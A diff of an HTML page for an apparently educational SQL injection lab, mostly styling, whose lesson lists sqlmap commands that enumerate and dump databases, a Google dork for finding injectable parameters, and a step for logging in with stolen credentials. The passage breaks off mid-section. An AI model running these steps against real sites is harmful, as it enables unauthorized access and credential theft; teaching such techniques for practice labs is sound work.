@@ -2,481 +2,661 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>SQL Injection Module | HackProof</title>
+<title>SQL Injection Lab | HackForge</title>
+<link rel="icon" href="logo.png" type="image/png">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;900&family=JetBrains+Mono:wght@400;500;600&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg: #020617;
-  --panel: #020617;
-  --border: #1e293b;
-  --text: #e5e7eb;
-  --muted: #94a3b8;
-  --green: #22c55e;
-  --blue: #38bdf8;
-  --red: #ef4444;
+  --bg:#000;--bg-panel:#080d16;--panel:#0d1422;--panel-light:#131c2e;
+  --border:rgba(196,255,0,0.15);--border-dim:rgba(196,255,0,0.07);
+  --text:#dde6f0;--muted:#7a8fa8;--accent:#c4ff00;
+  --accent-dim:rgba(196,255,0,0.08);--accent-glow:rgba(196,255,0,0.2);
+  --cyan:#00e5ff;--cyan-dim:rgba(0,229,255,0.1);
+  --danger:#ff4d4d;--warning:#f59e0b;--purple:#8b5cf6;
+  --sidebar-w:270px;
 }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden;line-height:1.75;}
+.bg-grid{position:fixed;inset:0;background-image:linear-gradient(rgba(196,255,0,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(196,255,0,0.02) 1px,transparent 1px);background-size:48px 48px;pointer-events:none;z-index:0;animation:gridDrift 24s linear infinite;}
+@keyframes gridDrift{from{transform:translate(0,0)}to{transform:translate(48px,48px)}}
+.bg-vignette{position:fixed;inset:0;background:radial-gradient(ellipse at 20% 10%,rgba(196,255,0,0.05) 0%,transparent 55%),radial-gradient(ellipse at 80% 90%,rgba(0,229,255,0.03) 0%,transparent 55%);pointer-events:none;z-index:0;}
 
-* { box-sizing: border-box; }
+/* SIDEBAR */
+.sidebar{position:fixed;left:0;top:0;width:var(--sidebar-w);height:100vh;background:linear-gradient(180deg,#02050e,#000);border-right:1px solid var(--border);z-index:200;display:flex;flex-direction:column;overflow:hidden;}
+.logo-wrap{padding:18px 16px 16px;border-bottom:1px solid var(--border-dim);background:linear-gradient(180deg,rgba(196,255,0,0.05),transparent);text-align:center;}
+.logo-img{width:160px;height:auto;filter:drop-shadow(0 0 18px rgba(196,255,0,0.45));display:block;margin:0 auto;transition:filter .3s,transform .3s;}
+.logo-img:hover{filter:drop-shadow(0 0 30px rgba(196,255,0,0.7));transform:scale(1.04);}
+.logo-sub{font-size:.65rem;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-top:8px;font-family:'JetBrains Mono',monospace;}
 
-body {
-  margin: 0;
-  font-family: 'Inter', sans-serif;
-  color: var(--text);
-  background:
-    radial-gradient(1200px 600px at 10% -10%, rgba(34,197,94,0.08), transparent),
-    radial-gradient(1000px 500px at 90% 10%, rgba(56,189,248,0.08), transparent),
-    linear-gradient(180deg, #020617, #000);
-}
+/* lab progress in sidebar */
+.lab-progress-box{margin:12px 12px 0;background:rgba(196,255,0,0.05);border:1px solid rgba(196,255,0,0.12);border-radius:10px;padding:12px 14px;}
+.lpb-label{font-family:'JetBrains Mono',monospace;font-size:.62rem;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase;margin-bottom:8px;}
+.lpb-bar-track{height:5px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden;}
+.lpb-bar-fill{height:100%;background:linear-gradient(90deg,var(--accent),#7fd600);border-radius:3px;width:0%;transition:width .8s ease;box-shadow:0 0 8px rgba(196,255,0,.4);}
+.lpb-pct{font-family:'Orbitron',sans-serif;font-size:.85rem;color:var(--accent);margin-top:5px;text-align:right;}
 
-/* HEADER */
-header {
-  text-align: center;
-  padding: 60px 20px 40px;
-  border-bottom: 1px solid var(--border);
-}
+.toc-label{padding:14px 22px 7px;font-family:'Orbitron',sans-serif;font-size:.58rem;letter-spacing:2.5px;text-transform:uppercase;color:var(--accent);opacity:.6;}
+.toc-scroll{flex:1;overflow-y:auto;padding:0 12px 12px;scrollbar-width:thin;scrollbar-color:rgba(196,255,0,.3) transparent;}
+.toc-link{display:flex;align-items:center;gap:10px;padding:8px 12px;margin:2px 0;border-radius:7px;color:var(--muted);text-decoration:none;font-size:.8rem;font-weight:500;transition:all .22s;border-left:2px solid transparent;}
+.toc-link .tn{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:rgba(196,255,0,.35);flex-shrink:0;width:20px;}
+.toc-link:hover{background:var(--accent-dim);color:var(--accent);border-left-color:var(--accent);transform:translateX(3px);}
+.toc-link.active{background:rgba(196,255,0,.12);color:var(--accent);border-left-color:var(--accent);}
+.toc-link.done .tn::before{content:'✓';color:var(--accent);}
+.sidebar-nav{padding:10px 12px;border-top:1px solid var(--border-dim);display:flex;flex-direction:column;gap:3px;}
+.sidebar-nav a{display:flex;align-items:center;gap:8px;padding:7px 12px;border-radius:7px;color:var(--muted);text-decoration:none;font-size:.8rem;font-weight:500;transition:all .2s;}
+.sidebar-nav a:hover{background:var(--accent-dim);color:var(--accent);}
+.sidebar-nav a.active{color:var(--accent);background:var(--accent-dim);}
 
-header h1 {
-  font-size: 2.5rem;
-  color: var(--blue);
-  margin-bottom: 10px;
-}
+/* MAIN */
+.main{margin-left:var(--sidebar-w);min-height:100vh;position:relative;z-index:1;}
+.topbar{position:sticky;top:0;z-index:100;background:rgba(0,0,0,.88);backdrop-filter:blur(18px);border-bottom:1px solid var(--border);padding:12px 48px;display:flex;align-items:center;justify-content:space-between;gap:16px;}
+.topbar-left{display:flex;align-items:center;gap:14px;}
+.breadcrumb{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted);display:flex;align-items:center;gap:6px;}
+.breadcrumb span{color:var(--accent);opacity:.6;}.breadcrumb strong{color:var(--text);}
+.difficulty-badge{padding:4px 12px;border-radius:5px;font-family:'JetBrains Mono',monospace;font-size:.7rem;font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
+.diff-medium{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.25);color:var(--warning);}
+.read-indicator{position:fixed;top:0;left:var(--sidebar-w);right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--cyan));transform-origin:left;transform:scaleX(0);z-index:300;transition:transform .1s;}
+.content{padding:40px 52px 80px;max-width:980px;}
 
-header p {
-  color: var(--muted);
-}
-
-/* NAV */
-.top-nav {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 14px 28px;
-  border-bottom: 1px solid #1e293b;
-  background: rgba(0,0,0,0.5);
-}
-
-/* CONTAINER */
-.container {
-  max-width: 1000px;
-  margin: auto;
-  padding: 60px 20px;
-}
+/* HERO */
+.page-hero{margin-bottom:36px;padding:40px 48px;background:linear-gradient(135deg,rgba(196,255,0,0.06),rgba(0,229,255,0.04));border:1px solid var(--border);border-radius:16px;position:relative;overflow:hidden;}
+.page-hero::before{content:'💉';position:absolute;right:36px;top:50%;transform:translateY(-50%);font-size:8rem;opacity:.04;pointer-events:none;}
+.hero-tag{display:inline-flex;align-items:center;gap:7px;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);color:var(--warning);padding:4px 12px;border-radius:5px;font-size:.72rem;font-family:'JetBrains Mono',monospace;letter-spacing:1px;text-transform:uppercase;margin-bottom:14px;}
+.page-hero h1{font-family:'Orbitron',sans-serif;font-size:2rem;font-weight:700;background:linear-gradient(135deg,#fff 30%,var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:10px;}
+.page-hero p{color:var(--muted);font-size:.93rem;max-width:640px;line-height:1.7;}
+.hero-meta{display:flex;gap:16px;margin-top:16px;flex-wrap:wrap;}
+.hm-chip{display:flex;align-items:center;gap:6px;font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--muted);background:var(--panel);border:1px solid var(--border-dim);padding:5px 11px;border-radius:6px;}
+.hm-chip .dot{width:6px;height:6px;border-radius:50%;}
 
 /* SECTION CARD */
-.section {
-  margin-bottom: 50px;
-  padding: 35px;
-  border: 1px solid #1e293b;
-  border-radius: 14px;
-  background: linear-gradient(180deg, #020617, #000);
-  box-shadow: 0 0 40px rgba(0,0,0,0.5);
-}
+.lab-section{background:var(--bg-panel);border:1px solid var(--border-dim);border-radius:14px;padding:32px 36px;margin-bottom:20px;position:relative;transition:border-color .3s;}
+.lab-section:hover{border-color:rgba(196,255,0,.15);}
+.lab-section::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),transparent);border-radius:14px 0 0 14px;opacity:0;transition:opacity .3s;}
+.lab-section:hover::before{opacity:1;}
+.s-head{display:flex;align-items:center;gap:14px;margin-bottom:20px;padding-bottom:14px;border-bottom:1px solid var(--border-dim);}
+.s-num{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--accent);opacity:.55;flex-shrink:0;}
+.lab-section h2{font-family:'Orbitron',sans-serif;font-size:1rem;font-weight:600;color:#fff;letter-spacing:.5px;}
+.s-badge{margin-left:auto;padding:3px 9px;border-radius:5px;font-size:.66rem;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;}
+.sb-cyan{background:var(--cyan-dim);border:1px solid rgba(0,229,255,.2);color:var(--cyan);}
+.sb-green{background:var(--accent-dim);border:1px solid var(--border);color:var(--accent);}
+.sb-warn{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.2);color:var(--warning);}
+.sb-red{background:rgba(255,77,77,.1);border:1px solid rgba(255,77,77,.2);color:var(--danger);}
+.sb-purple{background:rgba(139,92,246,.1);border:1px solid rgba(139,92,246,.2);color:var(--purple);}
 
-/* TITLES */
-.section h2 {
-  color: var(--blue);
-  margin-bottom: 15px;
-}
+/* text */
+.lab-section p{color:var(--muted);font-size:.9rem;margin-bottom:10px;line-height:1.78;}
+.lab-section strong{color:var(--text);}
+.lab-section h3{font-size:.92rem;font-weight:600;color:var(--text);margin:18px 0 8px;display:flex;align-items:center;gap:8px;}
+.lab-section h3::before{content:'';width:12px;height:2px;background:var(--accent);border-radius:1px;flex-shrink:0;}
+.lab-section ul,.lab-section ol{margin:8px 0 12px 20px;color:var(--muted);font-size:.88rem;}
+.lab-section li{margin:6px 0;line-height:1.65;}
+.lab-section li strong{color:var(--text);}
+.lab-section a{color:var(--cyan);text-decoration:none;}
+.lab-section a:hover{text-decoration:underline;}
 
-.section h3 {
-  color: #a5f3fc;
-  margin-top: 20px;
-}
+/* code */
+pre{background:#02040a;border:1px solid var(--border-dim);border-radius:10px;padding:16px 18px;margin:12px 0;overflow-x:auto;position:relative;}
+pre code{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--accent);line-height:1.8;}
+.pre-label{position:absolute;top:8px;right:12px;font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--muted);letter-spacing:1px;text-transform:uppercase;}
+code{font-family:'JetBrains Mono',monospace;background:rgba(196,255,0,0.07);border:1px solid rgba(196,255,0,0.12);color:var(--accent);padding:2px 6px;border-radius:4px;font-size:.82em;}
 
-/* TEXT */
-p {
-  color: #d1d5db;
-  line-height: 1.8;
-}
+/* callouts */
+.note-box{background:rgba(196,255,0,0.04);border-left:3px solid var(--accent);padding:14px 18px;border-radius:8px;margin:14px 0;font-size:.88rem;color:var(--muted);}
+.note-box strong{color:var(--text);}
+.warn-box{background:rgba(255,77,77,0.05);border-left:3px solid var(--danger);padding:14px 18px;border-radius:8px;margin:14px 0;font-size:.88rem;color:var(--muted);}
+.warn-box strong{color:var(--text);}
+.info-box{background:rgba(0,229,255,0.04);border-left:3px solid var(--cyan);padding:14px 18px;border-radius:8px;margin:14px 0;font-size:.88rem;color:var(--muted);}
+.info-box strong{color:var(--text);}
 
-ul {
-  margin-left: 25px;
-}
+/* step cards */
+.step-grid{display:flex;flex-direction:column;gap:12px;margin:14px 0;}
+.step-card{display:flex;align-items:flex-start;gap:14px;padding:14px 16px;background:var(--panel);border:1px solid var(--border-dim);border-radius:10px;transition:all .2s;}
+.step-card:hover{border-color:var(--border);background:var(--panel-light);}
+.step-num{font-family:'Orbitron',sans-serif;font-size:.72rem;color:var(--accent);flex-shrink:0;padding-top:2px;opacity:.7;min-width:24px;}
+.step-title{font-weight:600;color:var(--text);font-size:.88rem;margin-bottom:3px;}
+.step-desc{font-size:.82rem;color:var(--muted);line-height:1.55;}
 
-/* CODE BLOCK */
-pre {
-  background: #000;
-  border: 1px solid #1e293b;
-  padding: 15px;
-  border-radius: 8px;
-  overflow-x: auto;
-}
+/* target table */
+.target-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.85rem;}
+.target-table thead tr{background:rgba(196,255,0,.07);border-bottom:1px solid var(--border);}
+.target-table th{padding:10px 14px;text-align:left;font-family:'Orbitron',monospace;font-size:.63rem;color:var(--accent);letter-spacing:.8px;text-transform:uppercase;}
+.target-table td{padding:9px 14px;border-bottom:1px solid var(--border-dim);color:var(--muted);}
+.target-table td:first-child{color:var(--text);font-weight:500;}
+.target-table tr:hover td{background:rgba(196,255,0,.03);}
+.target-link{color:var(--cyan);font-family:'JetBrains Mono',monospace;font-size:.8rem;}
 
-code {
-  color: #a5f3fc;
-}
+/* ── INTERACTIVE LAB SECTION ── */
+.live-lab{background:var(--bg-panel);border:2px solid rgba(196,255,0,0.2);border-radius:16px;padding:36px;margin-bottom:20px;position:relative;overflow:hidden;}
+.live-lab::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--accent),var(--cyan),transparent);animation:labGlow 3s linear infinite;}
+@keyframes labGlow{from{transform:translateX(-100%)}to{transform:translateX(100%)}}
+.live-lab-title{font-family:'Orbitron',sans-serif;font-size:1.05rem;font-weight:700;color:var(--accent);margin-bottom:4px;display:flex;align-items:center;gap:10px;}
+.live-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:blink 1.2s infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.live-lab-sub{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--muted);margin-bottom:24px;letter-spacing:.3px;}
 
-/* IMAGE */
-img {
-  max-width: 70%;
-  display: block;
-  margin: 25px auto;
-  border-radius: 8px;
-  border: 1px solid #1e293b;
-}
+/* target URL bar */
+.target-bar{display:flex;align-items:center;gap:10px;background:#02040a;border:1px solid var(--border-dim);border-radius:8px;padding:10px 16px;margin-bottom:18px;font-family:'JetBrains Mono',monospace;font-size:.8rem;}
+.target-bar-label{color:var(--muted);flex-shrink:0;}
+.target-bar-url{color:var(--cyan);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.target-bar-status{padding:3px 8px;border-radius:4px;font-size:.65rem;font-weight:700;letter-spacing:.5px;flex-shrink:0;}
+.tbs-live{background:rgba(196,255,0,.1);border:1px solid rgba(196,255,0,.2);color:var(--accent);}
 
-/* NOTE */
-.note {
-  margin-top: 25px;
-  padding: 20px;
-  border-left: 4px solid #22c55e;
-  background: #020617;
-  color: #bbf7d0;
-}
+/* terminal */
+.terminal{background:#000;border:1px solid rgba(196,255,0,.15);border-radius:10px;overflow:hidden;margin-bottom:16px;}
+.terminal-header{display:flex;align-items:center;gap:8px;padding:10px 16px;background:#02040a;border-bottom:1px solid rgba(196,255,0,.08);}
+.term-dot{width:10px;height:10px;border-radius:50%;}
+.term-dot.red{background:#ff5f57;}.term-dot.amber{background:#ffbd2e;}.term-dot.green{background:#28c840;}
+.term-title{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--muted);margin-left:8px;letter-spacing:1px;}
+.terminal-body{padding:16px 18px;font-family:'JetBrains Mono',monospace;font-size:.8rem;line-height:1.8;min-height:120px;max-height:280px;overflow-y:auto;color:#c4ff00;}
+.terminal-body .t-muted{color:var(--muted);}
+.terminal-body .t-cyan{color:var(--cyan);}
+.terminal-body .t-red{color:var(--danger);}
+.terminal-body .t-white{color:#fff;}
+.terminal-input-row{display:flex;align-items:center;gap:8px;padding:0 18px 14px;}
+.term-prompt{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--accent);flex-shrink:0;}
+.term-input{flex:1;background:transparent;border:none;outline:none;color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.8rem;caret-color:var(--accent);}
+.run-btn{padding:7px 16px;background:linear-gradient(135deg,var(--accent),#7fd600);color:#000;border:none;border-radius:6px;font-weight:700;font-size:.78rem;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s;white-space:nowrap;}
+.run-btn:hover{transform:translateY(-1px);box-shadow:0 3px 12px rgba(196,255,0,.3);}
 
-/* WARNING */
-.warning {
-  margin-top: 30px;
-  padding: 20px;
-  border-left: 4px solid #ef4444;
-  background: #020617;
-  color: #fecaca;
-}
+/* login bypass simulator */
+.sqli-sim{background:#02040a;border:1px solid var(--border-dim);border-radius:10px;padding:20px;margin:16px 0;}
+.sim-title{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:14px;}
+.sim-form{display:flex;flex-direction:column;gap:10px;}
+.sim-input{background:var(--panel);border:1px solid var(--border-dim);border-radius:7px;padding:10px 14px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.85rem;outline:none;transition:all .2s;}
+.sim-input:focus{border-color:rgba(196,255,0,.3);box-shadow:0 0 0 2px rgba(196,255,0,.06);}
+.sim-btn{padding:10px;background:var(--panel);border:1px solid var(--border);border-radius:7px;color:var(--accent);font-weight:700;font-size:.85rem;cursor:pointer;font-family:'DM Sans',monospace;transition:all .2s;}
+.sim-btn:hover{background:rgba(196,255,0,.08);}
+.sim-result{margin-top:12px;padding:12px 14px;border-radius:7px;font-family:'JetBrains Mono',monospace;font-size:.8rem;display:none;line-height:1.6;}
+.sim-result.success{background:rgba(196,255,0,.07);border:1px solid rgba(196,255,0,.2);color:var(--accent);}
+.sim-result.fail{background:rgba(255,77,77,.07);border:1px solid rgba(255,77,77,.2);color:var(--danger);}
 
-/* VIVA SECTION */
-#vivaSection {
-  margin-top: 100px;
-  border: 2px dashed #22c55e;
-  background: linear-gradient(180deg,#020617,#000);
-  border-radius: 14px;
-  padding: 40px;
-}
+/* VIVA / QUIZ */
+.viva-section{background:var(--bg-panel);border:2px dashed rgba(196,255,0,.25);border-radius:16px;padding:36px;margin-bottom:20px;position:relative;}
+.viva-locked-overlay{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;gap:12px;}
+.lock-icon{font-size:3rem;opacity:.4;}
+.lock-msg{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--muted);text-align:center;letter-spacing:.5px;}
+.viva-timer{font-family:'Orbitron',sans-serif;font-size:1.4rem;color:var(--cyan);text-align:center;letter-spacing:3px;margin:10px 0;display:none;}
+.quiz-q{background:var(--panel);border:1px solid var(--border-dim);border-radius:10px;padding:18px 20px;margin-bottom:14px;}
+.quiz-q p{font-size:.92rem;font-weight:600;color:var(--text);margin-bottom:12px;}
+.quiz-q label{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:7px;cursor:pointer;font-size:.88rem;color:var(--muted);transition:background .2s;}
+.quiz-q label:hover{background:rgba(196,255,0,.05);color:var(--text);}
+.quiz-q input[type="radio"]{accent-color:var(--accent);flex-shrink:0;}
+.quiz-submit{width:100%;padding:13px;background:linear-gradient(135deg,var(--accent),#7fd600);color:#000;border:none;border-radius:9px;font-weight:700;font-size:.9rem;cursor:pointer;font-family:'Orbitron',sans-serif;letter-spacing:.5px;transition:all .3s;box-shadow:0 0 18px rgba(196,255,0,.2);margin-top:8px;}
+.quiz-submit:hover{transform:translateY(-2px);box-shadow:0 4px 24px rgba(196,255,0,.4);}
+.quiz-result-box{background:var(--panel);border-radius:10px;padding:20px;text-align:center;margin-top:16px;display:none;}
+.cert-btn{display:inline-block;margin-top:14px;padding:12px 28px;background:linear-gradient(135deg,var(--accent),#7fd600);color:#000;font-weight:700;border-radius:8px;text-decoration:none;font-family:'Orbitron',sans-serif;font-size:.82rem;transition:all .3s;box-shadow:0 0 16px rgba(196,255,0,.25);}
+.cert-btn:hover{transform:translateY(-2px);box-shadow:0 4px 20px rgba(196,255,0,.45);}
 
-/* FOOTER */
-footer {
-  text-align: center;
-  padding: 40px;
-  border-top: 1px solid #1e293b;
-  color: #64748b;
-}
+footer{text-align:center;padding:24px 52px;border-top:1px solid var(--border-dim);font-size:.8rem;color:var(--muted);font-family:'JetBrains Mono',monospace;}
+footer a{color:var(--cyan);text-decoration:none;}
+
+@media(max-width:860px){:root{--sidebar-w:0px;}.sidebar{display:none;}.content{padding:20px 16px 60px;}.topbar{padding:12px 20px;}}
 </style>
 </head>
-
 <body>
+<div class="bg-grid"></div>
+<div class="bg-vignette"></div>
+<div class="read-indicator" id="readIndicator"></div>
 
-<header>
-  <h1>SQL Injection Learning Module</h1>
-  <p>Database exploitation concepts and defensive security understanding</p>
-</header>
-
-<nav class="top-nav">
-  <div>
-    <strong style="color:#22c55e;">HackProof Notes</strong>
-    <a href="practice-lab.html">Labs</a>
+<!-- ══════════ SIDEBAR ══════════ -->
+<aside class="sidebar">
+  <div class="logo-wrap">
+    <img src="logo.png" alt="HackForge" class="logo-img">
+    <div class="logo-sub">Practical Labs</div>
   </div>
-  <div>
-    <a href="login.html">Login</a>
+
+  <div class="lab-progress-box">
+    <div class="lpb-label">Lab Progress</div>
+    <div class="lpb-bar-track"><div class="lpb-bar-fill" id="progressFill"></div></div>
+    <div class="lpb-pct" id="progressPct">0%</div>
   </div>
-</nav>
 
-<div class="container">
-<!-- PAGE 1 -->
-<div class="section">
-  <h2>What Is SQL Injection</h2>
-  <p>
-    SQL Injection (SQLi) is a cyberattack technique where a hacker inserts malicious SQL code
-    into an input field (like a login form or search box) to manipulate or access a database illegally.
-  </p>
+  <div class="toc-label">Sections</div>
+  <div class="toc-scroll">
+    <a class="toc-link" href="#s1"><span class="tn">01</span>What is SQL Injection</a>
+    <a class="toc-link" href="#s2"><span class="tn">02</span>DB Attack Information</a>
+    <a class="toc-link" href="#s3"><span class="tn">03</span>SQLmap Tool</a>
+    <a class="toc-link" href="#s4"><span class="tn">04</span>Manual SQLi (No Tool)</a>
+    <a class="toc-link" href="#s5"><span class="tn">05</span>Crunch Wordlists</a>
+    <a class="toc-link" href="#s6"><span class="tn">06</span>🧪 Live Lab</a>
+    <a class="toc-link" href="#s7"><span class="tn">07</span>🎯 Target Servers</a>
+    <a class="toc-link" href="#s8"><span class="tn">08</span>🎓 Final Viva</a>
+  </div>
 
-  <p>In this section we are going to take a look at ….</p>
-  <ul>
-    <li>Database Attack Techniques for Database.</li>
-    <li>Database Attack Tools in Kali Linux O.S</li>
-  </ul>
+  <div class="sidebar-nav">
+    <a href="index.html">📓 Notes</a>
+    <a href="practice-lab.html" class="active">⚗️ Labs</a>
+    <a href="roadmap.html">🗺️ Roadmap</a>
+    <a href="cyber-news.html">📡 Cyber News</a>
+  </div>
+</aside>
 
-  <h3>Structure of the database:</h3>
-  <img src="https://i.imgur.com/5w4VZ7N.png" alt="Database Structure">
-  <p>
-    Reference video:
-    <a href="https://screenrec.com/share/h6GVUDBxoe" target="_blank">https://screenrec.com/share/h6GVUDBxoe</a>
-  </p>
-</div>
+<!-- ══════════ MAIN ══════════ -->
+<main class="main">
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="breadcrumb"><span>HackForge</span> / <span>Labs</span> / <strong>SQL Injection</strong></div>
+      <div class="difficulty-badge diff-medium">⚠ Medium</div>
+    </div>
+    <div style="font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--muted);">XP: <span style="color:var(--accent);">+150</span></div>
+  </div>
 
-<!-- PAGE 2 -->
-<div class="section">
-  <h2>Database Attack Information</h2>
-  <ul>
-    <li>Gather Sensitive Information from Database</li>
-    <li>Information like Username, Password, E-mail, Address can be gathered.</li>
-    <li>Database Assessment tools are available in kali Linux O.S. (like SQL map, JSQL).</li>
-  </ul>
-</div>
+  <div class="content">
 
-<!-- PAGE 3 -->
-<div class="section">
-  <h2>Website Database Hacking Using SQLmap Tool</h2>
+    <!-- HERO -->
+    <div class="page-hero">
+      <div class="hero-tag">💉 Injection Attack</div>
+      <h1>SQL Injection Learning Module</h1>
+      <p>Database exploitation concepts and defensive security understanding. Learn how attackers extract credentials from vulnerable databases and how to defend against it.</p>
+      <div class="hero-meta">
+        <div class="hm-chip"><div class="dot" style="background:var(--warning);box-shadow:0 0 5px var(--warning);"></div>Medium Difficulty</div>
+        <div class="hm-chip"><div class="dot" style="background:var(--accent);box-shadow:0 0 5px var(--accent);"></div>5 Sections + Live Lab</div>
+        <div class="hm-chip"><div class="dot" style="background:var(--cyan);box-shadow:0 0 5px var(--cyan);"></div>5-min Final Viva</div>
+        <div class="hm-chip"><div class="dot" style="background:var(--purple);box-shadow:0 0 5px var(--purple);"></div>+150 XP on Pass</div>
+      </div>
+    </div>
 
-  <h3>What is SQL Map</h3>
-  <ul>
-    <li>SQL Map is a command-line tool</li>
-    <li>It is used to automate SQL injection testing</li>
-    <li>It helps in identifying databases, tables, columns, and data</li>
-  </ul>
+    <!-- S1 -->
+    <div class="lab-section" id="s1">
+      <div class="s-head"><span class="s-num">01</span><h2>What Is SQL Injection</h2><span class="s-badge sb-cyan">Theory</span></div>
+      <p>SQL Injection (SQLi) is a cyberattack technique where a hacker inserts malicious SQL code into an input field (like a login form or search box) to manipulate or access a database illegally.</p>
+      <p>In this section we are going to take a look at ….</p>
+      <ul>
+        <li>Database Attack Techniques for Database.</li>
+        <li>Database Attack Tools in Kali Linux O.S</li>
+      </ul>
+      <h3>Structure of the database:</h3>
+      <img src="https://i.imgur.com/5w4VZ7N.png" alt="Database Structure" style="max-width:80%;display:block;margin:16px auto;border-radius:10px;border:1px solid var(--border-dim);">
+      <p>Reference video: <a href="https://screenrec.com/share/h6GVUDBxoe" target="_blank">https://screenrec.com/share/h6GVUDBxoe</a></p>
+    </div>
 
-  <h3>SQL Map – Step-by-Step</h3>
+    <!-- S2 -->
+    <div class="lab-section" id="s2">
+      <div class="s-head"><span class="s-num">02</span><h2>Database Attack Information</h2><span class="s-badge sb-warn">Recon</span></div>
+      <ul>
+        <li>Gather Sensitive Information from Database</li>
+        <li>Information like Username, Password, E-mail, Address can be gathered.</li>
+        <li>Database Assessment tools are available in kali Linux O.S. (like SQL map, JSQL).</li>
+      </ul>
+      <div class="info-box"><strong>🎯 Goal:</strong> Understand the database structure before attacking — identify databases, then tables, then columns, then data.</div>
+    </div>
 
-  <h3>1. Initial Preparation</h3>
-  <ul>
-    <li>Open Google</li>
-    <li>Open any website</li>
-    <li>Do not perform on live websites</li>
-    <li>Only test on:</li>
-    <ul>
-      <li>Your own website</li>
-      <li>Test or practice websites</li>
-    </ul>
-  </ul>
+    <!-- S3 -->
+    <div class="lab-section" id="s3">
+      <div class="s-head"><span class="s-num">03</span><h2>Website Database Hacking Using SQLmap Tool</h2><span class="s-badge sb-red">Automated</span></div>
 
-  <h3>2. Finding the Login Page</h3>
-  <ul>
-    <li>Open the website</li>
-    <li>Go to the sign-in / login page</li>
-    <li>Identify where:</li>
-    <ul>
-      <li>Username field exists</li>
-      <li>Password field exists</li>
-    </ul>
-    <li>Copy the URL of the login or signup page</li>
-  </ul>
+      <h3>What is SQL Map</h3>
+      <ul>
+        <li>SQL Map is a command-line tool</li>
+        <li>It is used to automate SQL injection testing</li>
+        <li>It helps in identifying databases, tables, columns, and data</li>
+      </ul>
 
-  <h3>3. Identifying Source Links</h3>
-  <ul>
-    <li>Open a new Google page</li>
-    <li>Use search technique with:</li>
-    <ul>
-      <li>Site:website URL/ php?id=</li>
-    </ul>
-  </ul>
+      <h3>SQL Map – Step-by-Step</h3>
+      <div class="step-grid">
+        <div class="step-card"><div class="step-num">01</div><div><div class="step-title">Initial Preparation</div><div class="step-desc">Open Kali Linux. Do NOT test on live websites. Only test on your own website or practice websites.</div></div></div>
+        <div class="step-card"><div class="step-num">02</div><div><div class="step-title">Finding the Login Page</div><div class="step-desc">Open the website. Go to the sign-in / login page. Identify username and password fields. Copy the URL.</div></div></div>
+        <div class="step-card"><div class="step-num">03</div><div><div class="step-title">Identifying Source Links</div><div class="step-desc">Use Google dork: <code>site:targetsite.com php?id=</code> to find injectable parameters.</div></div></div>
+        <div class="step-card"><div class="step-num">04</div><div><div class="step-title">Open the Terminal</div><div class="step-desc">Aim is to find Database → Table → Columns → Data.</div></div></div>
+        <div class="step-card"><div class="step-num">05</div><div><div class="step-title">Using Retrieved Credentials</div><div class="step-desc">Go back to the admin or login page. Enter retrieved username and password. Login is successful.</div></div></div>
+      </div>
 
-  <h3>4. Open the terminal</h3>
-  <p>Aim is to find – Database – table – columns and data.</p>
-
-  <pre><code>Sqlmap -u websitelink --dbs
+      <h3>SQLmap Commands</h3>
+      <div style="position:relative;"><pre><div class="pre-label">Terminal</div><code>Sqlmap -u websitelink --dbs
 Sqlmap -u websitelink -D databasename --tables
 Sqlmap -u websitelink -D databasename -T tablename --columns
-Sqlmap -u websitelink -D databasename -T tablename -C columnname --dump</code></pre>
+Sqlmap -u websitelink -D databasename -T tablename -C columnname --dump</code></pre></div>
 
-  <h3>5. Using Retrieved Credentials</h3>
-  <ul>
-    <li>Go back to the admin or login page</li>
-    <li>Enter retrieved username</li>
-    <li>Enter retrieved password</li>
-    <li>Login is successful</li>
-    <li>User dashboard or credentials become visible</li>
-  </ul>
-
-  <p>
